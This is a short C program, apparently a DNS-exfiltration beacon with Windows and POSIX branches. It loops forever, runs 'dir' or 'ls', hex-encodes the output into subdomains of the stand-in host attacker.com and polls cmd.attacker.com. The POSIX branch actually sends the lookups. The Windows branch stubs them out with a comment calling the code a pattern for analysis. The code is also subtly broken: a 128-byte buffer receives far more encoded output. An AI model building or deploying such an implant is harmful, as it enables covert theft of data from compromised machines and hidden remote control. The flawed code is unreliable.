#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

static void dns_exfiltrate(const char *data) {
    char query[256];
    char encoded[128];
    int i;
    for (i = 0; data[i]; i++)
        sprintf(encoded + (i*2), "%02x", (unsigned char)data[i]);
    encoded[i*2] = '\0';
    snprintf(query, sizeof(query), "%s.%s.attacker.com", encoded, data);
    (void)query; /* gethostbyname(query) would resolve */
}

int main(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    while (1) {
        dns_exfiltrate("beacon");
        Sleep(5000);

        /* Simplified: no real DNS TXT; just pattern for analysis */
        {
            FILE *fp = popen("dir", "r");
            char output[1024] = { 0 };
            if (fp) {
                fread(output, 1, sizeof(output) - 1, fp);
                pclose(fp);
                dns_exfiltrate(output);
            }
        }
    }
    WSACleanup();
    return 0;
}
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

void dns_exfiltrate(char *data) {
    char query[256];
    char encoded[128];

    for(int i = 0; data[i]; i++) {
        sprintf(encoded + (i*2), "%02x", data[i]);
    }

    snprintf(query, sizeof(query), "%s.%s.attacker.com", encoded, data);
    gethostbyname(query);
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];
    char command[256];

    while(1) {
        dns_exfiltrate("beacon");
        sleep(5);

        struct hostent *he = gethostbyname("cmd.attacker.com");
        if(he) {
            FILE *fp = popen("ls", "r");
            char output[1024] = {0};
            fread(output, 1, sizeof(output), fp);
            pclose(fp);
            dns_exfiltrate(output);
        }
    }

    return 0;
}
#endif
